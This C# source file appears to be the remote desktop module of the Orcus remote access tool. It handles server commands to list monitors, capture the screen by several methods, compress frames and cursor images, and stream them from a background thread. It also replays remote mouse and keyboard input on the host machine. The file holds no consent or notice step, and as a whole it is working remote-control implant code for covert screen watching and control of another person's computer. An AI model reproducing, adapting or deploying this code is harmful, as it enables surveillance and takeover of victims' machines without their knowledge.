using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Orcus.Commands.ConnectionInitializer;
using Orcus.Commands.RemoteDesktop.Capture;
using Orcus.Commands.RemoteDesktop.Capture.DesktopDuplication;
using Orcus.Commands.RemoteDesktop.Capture.FrontBuffer;
using Orcus.Commands.RemoteDesktop.Capture.GDI;
using Orcus.Commands.RemoteDesktop.Compression;
using Orcus.Plugins;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities.Compression;
using Orcus.Utilities;

namespace Orcus.Commands.RemoteDesktop
{
    [DisallowMultipleThreads]
    public class RemoteDesktopCommand : Command
    {
        private readonly Dictionary<CaptureType, Func<IScreenCaptureService>> _screenCaptureServices;
        private readonly object _streamComponentsLock = new object();
        private IConnection _connection;
        private IConnectionInfo _connectionInfo;
        private bool _isStreaming;
        private IScreenCaptureService _screenCaptureService;
        private CursorStreamCodec _cursorStreamCodec;
        private ImageCompressionType _compressionType;
        private IImageCompression _currentImageCompression;
        private IStreamCodec _unsafeCodec;
        private int _currentMonitor;
        private readonly RemoteActions _remoteActions;
        private bool _drawCursor;

        public RemoteDesktopCommand()
        {
            _screenCaptureServices = new Dictionary<CaptureType, Func<IScreenCaptureService>>
            {
                {CaptureType.GDI, () => new GdiService()},
                {CaptureType.FrontBuffer, () => new FrontBufferService()},
                {CaptureType.DesktopDuplication, () => new DesktopDuplicationService()}
            };

            _remoteActions = new RemoteActions();
        }

        public override void Dispose()
        {
            base.Dispose();

            Program.WriteLine("Dispose Remote Desktop...");

            var wasStreaming = _isStreaming;
            _isStreaming = false;

            Program.WriteLine("_isStreaming = false");

            lock (_streamComponentsLock)
            {
                if (!wasStreaming)
                {
                    _connection?.Dispose();
                    _screenCaptureService?.Dispose();
                }

                _cursorStreamCodec?.Dispose();
                _currentImageCompression?.Dispose();
            }

            Program.WriteLine("Remote Desktop disposed");
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            Program.WriteLine("Remote Desktop command received: " + (RemoteDesktopCommunication) parameter[0]);

            switch ((RemoteDesktopCommunication) parameter[0])
            {
                case RemoteDesktopCommunication.GetInfo:
                    var remoteDesktopInformation = new RemoteDesktopInformation
                    {
                        Screens = new List<ScreenInfo>()
                    };

                    var screens = Screen.AllScreens;
                    var allNames = ScreenExtensions.GetAllMonitorsFriendlyNames().ToArray();

                    for (int i = 0; i < screens.Length; i++)
                        remoteDesktopInformation.Screens.Add(new ScreenInfo
                        {
                            Number = i,
                            Width = screens[i].Bounds.Width,
                            Height = screens[i].Bounds.Height,
                            Name =
                                allNames.Length >= i && !string.IsNullOrEmpty(allNames[i])
                                    ? allNames[i]
                                    : screens[i].DeviceName
                        });

                    foreach (var screenCaptureService in _screenCaptureServices)
                    {
                        if (screenCaptureService.Value().IsSupported)
                            remoteDesktopInformation.AvailableCaptureTypes |= screenCaptureService.Key;
                    }
                    
                    ResponseBytes((byte) RemoteDesktopCommunication.ResponseInfo,
                        new Serializer(typeof (RemoteDesktopInformation)).Serialize(remoteDesktopInformation),
                        connectionInfo);
                    break;
                case RemoteDesktopCommunication.InitializeConnection:
                    var connectionGuid = new Guid(parameter.Skip(1).Take(16).ToArray());
                    _connection?.Dispose();
                    _connection = connectionInfo.ConnectionInitializer.TakeConnection(connectionGuid);
                    break;
                case RemoteDesktopCommunication.InitializeDirectConnection:
                    _connection = new ServerConnection(connectionInfo, this,
                        (byte) RemoteDesktopCommunication.ResponseFrame);
                    break;
                case RemoteDesktopCommunication.Initialize:
                    var captureType = (CaptureType) parameter[1];
                    var monitor = (int) parameter[2];
                    var quality = (int) parameter[3];
                    var drawCursor = parameter[4] == 1;
                    var compression = (ImageCompressionType) parameter[5];

                    Program.WriteLine("Lock _streamComponents, InitializeStreamingComponents");

                    lock (_streamComponentsLock)
                        InitializeStreamingComponents(captureType, monitor, quality, connectionInfo, drawCursor, compression);
                    break;
                case RemoteDesktopCommunication.ChangeQuality:
                    var newQuality = (int) parameter[1];

                    lock (_streamComponentsLock)
                    {
                        if (_unsafeCodec.ImageQuality != newQuality)
                            _unsafeCodec.ImageQuality = newQuality;
                    }
                    break;
                case RemoteDesktopCommunication.Start:
                    if (_isStreaming)
                        return;

                    Program.WriteLine("Start streaming; _isStreaming = true");

                    _connectionInfo = connectionInfo;
                    _isStreaming = true;
                    new Thread(Streaming) {IsBackground = true}.Start();
                    break;
                case RemoteDesktopCommunication.Stop:
                    Program.WriteLine("Stop streaming...; _isStreaming = false; Lock _streamComponentsLock");

                    _isStreaming = false;
                    //important, it locks this command until the stuff is stopped
                    lock (_streamComponentsLock) { }

                    Program.WriteLine("Stopped streaming");
                    break;
                case RemoteDesktopCommunication.ChangeMonitor:
                    monitor = parameter[1];
                    lock (_streamComponentsLock)
                    {
                        _screenCaptureService.ChangeMonitor(monitor);
                        _unsafeCodec?.Dispose();

                        _unsafeCodec = new UnsafeStreamCodec(GetImageCompression(_compressionType),
                            UnsafeStreamCodecParameters.UpdateImageEveryTwoSeconds |
                            UnsafeStreamCodecParameters.DontDisposeImageCompressor);

                        _currentMonitor = monitor;
                    }
                    break;
                case RemoteDesktopCommunication.DesktopAction:
                    DoDesktopAction((RemoteDesktopAction) parameter[1], parameter, 2);
                    break;
                case RemoteDesktopCommunication.ChangeDrawCursor:
                    lock (_streamComponentsLock)
                    {
                        if (parameter[1] == 1)
                        {
                            _drawCursor = true;
                            _cursorStreamCodec = new CursorStreamCodec();
                        }
                        else
                        {
                            _cursorStreamCodec?.Dispose();
                            _drawCursor = false;
                        }
                    }
                    break;
            }
        }

        public void Streaming()
        {
            byte[] cursorData = null;

            Program.WriteLine("Enter streaming method");

            using (_connection)
            using (_screenCaptureService)
            using (_cursorStreamCodec)
                while (_isStreaming)
                {
                    //locks are quite expensive so we capture 10 frames and then lock again
                    lock (_streamComponentsLock)
                        for (int i = 0; i < 10; i++)
                        {
                            if (!_isStreaming)
                            {
                                Program.WriteLine("Leave streaming method (_isStreaming check failed)");
                                return;
                            }

                            Program.WriteLine("Begin capture screen...");
                            var data = _screenCaptureService.CaptureScreen(_unsafeCodec, _cursorStreamCodec, _drawCursor);
                            Program.WriteLine("Screen captured...");
                            if (data == null)
                            {
                                Program.WriteLine("Screen data was null");
                                continue;
                            }

                            var bytesToSend = 2 + data.Length;
                            var flags = ScreenResponseFlags.Frame;

                            if (_drawCursor && _cursorStreamCodec != null)
                            {
                                Program.WriteLine("Get cursor");
                                cursorData = _cursorStreamCodec.CodeCursor();
                                bytesToSend += cursorData.Length + 4;
                                flags |= ScreenResponseFlags.Cursor;
                                Program.WriteLine("Cursor captured");
                            }

                            try
                            {
                                Program.WriteLine("Send data");
                                if (_connection.SupportsStream)
                                    _connection.SendStream(new WriterCall(bytesToSend,
                                        writer =>
                                        {
                                            writer.Write((byte) flags);
                                            if (_drawCursor && cursorData != null)
                                            {
                                                writer.Write(cursorData.Length);
                                                writer.Write(cursorData);
                                            }

                                            writer.Write((byte) _currentMonitor);
                                            data.WriteIntoStream(writer.BaseStream);
                                        }));
                                else
                                {
                                    var buffer = new byte[bytesToSend];
                                    buffer[0] = (byte) flags;

                                    var index = 1;
                                    if (_drawCursor && cursorData != null)
                                    {
                                        Buffer.BlockCopy(BitConverter.GetBytes(cursorData.Length), 0, buffer, index, 4);
                                        Buffer.BlockCopy(cursorData, 0, buffer, index + 4, cursorData.Length);

                                        index += cursorData.Length + 4;
                                    }

                                    buffer[index] = (byte) _currentMonitor;
                                    data.WriteToBuffer(buffer, index + 1);

                                    _connection.SendData(buffer, 0, buffer.Length);
                                }
                                Program.WriteLine("Data sent");
                            }
                            catch (Exception ex)
                            {
                                if (!_isStreaming)
                                {
                                    Program.WriteLine("Leave streaming method (_isStreaming check failed and exception): " + ex);
                                    return;
                                }

                                ResponseByte((byte) RemoteDesktopCommunication.ResponseCaptureCancelled, _connectionInfo);
                            }
                        }
                }

            Program.WriteLine("Leave streaming method");
        }

        private void InitializeStreamingComponents(CaptureType captureType, int monitor, int quality,
            IConnectionInfo connectionInfo, bool drawCursor, ImageCompressionType compressionType)
        {
            var oldScreenCaptureService = _screenCaptureService;
            _screenCaptureService = _screenCaptureServices[captureType]();

            try
            {
                _screenCaptureService.Initialize(monitor);
            }
            catch (Exception ex)
            {
                _screenCaptureService = oldScreenCaptureService;
                ResponseBytes((byte) RemoteDesktopCommunication.ResponseInitializationFailed,
                    Encoding.UTF8.GetBytes(ex.Message), connectionInfo);
                return;
            }

            Program.WriteLine($"InitializeStreamingComponents: oldScreenCaptureService == null: {oldScreenCaptureService == null} (else dispose)");

            oldScreenCaptureService?.Dispose();

            Program.WriteLine("Dispose other stuff in InitializeStreamingComponents");

            _unsafeCodec?.Dispose();
            _cursorStreamCodec?.Dispose();

            _unsafeCodec = new UnsafeStreamCodec(GetImageCompression(compressionType),
                UnsafeStreamCodecParameters.DontDisposeImageCompressor |
                UnsafeStreamCodecParameters.UpdateImageEveryTwoSeconds);

            _currentImageCompression.Quality = quality;

            if (drawCursor)
                _cursorStreamCodec = new CursorStreamCodec();

            _compressionType = compressionType;

            _currentMonitor = monitor;
            _drawCursor = drawCursor;

            ResponseByte((byte) RemoteDesktopCommunication.ResponseInitializationSucceeded, connectionInfo);
            Debug.Print("Initialized");
        }

        private IImageCompression GetImageCompression(ImageCompressionType compressionType)
        {
            if (_compressionType == compressionType && _currentImageCompression != null)
                return _currentImageCompression;

            _currentImageCompression?.Dispose();
            _compressionType = compressionType;

            switch (compressionType)
            {
                case ImageCompressionType.ManagedJpg:
                    return _currentImageCompression = new JpgCompression(70);
                case ImageCompressionType.TurboJpg:
                    return _currentImageCompression = new TurboJpgImageCompression(false);
                case ImageCompressionType.NoCompression:
                    return _currentImageCompression = new NoCompression();
                default:
                    throw new ArgumentOutOfRangeException(nameof(compressionType), compressionType, null);
            }
        }

        private void DoDesktopAction(RemoteDesktopAction remoteDesktopAction, byte[] data, int index)
        {
            switch (remoteDesktopAction)
            {
                case RemoteDesktopAction.Mouse:
                    var x = BitConverter.ToInt32(data, index + 1);
                    var y = BitConverter.ToInt32(data, index + 5);
                    var extra = BitConverter.ToInt32(data, index + 9);
                    _remoteActions.DoMouseAction((RemoteDesktopMouseAction) data[index], x, y, extra, _currentMonitor);
                    break;
                case RemoteDesktopAction.Keyboard:
                    var scanCode = BitConverter.ToInt16(data, index + 1);
                    _remoteActions.DoKeyboardAction((RemoteDesktopKeyboardAction) data[index], scanCode);
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(remoteDesktopAction), remoteDesktopAction, null);
            }
        }

        protected override uint GetId()
        {
            return 14;
        }
    }
}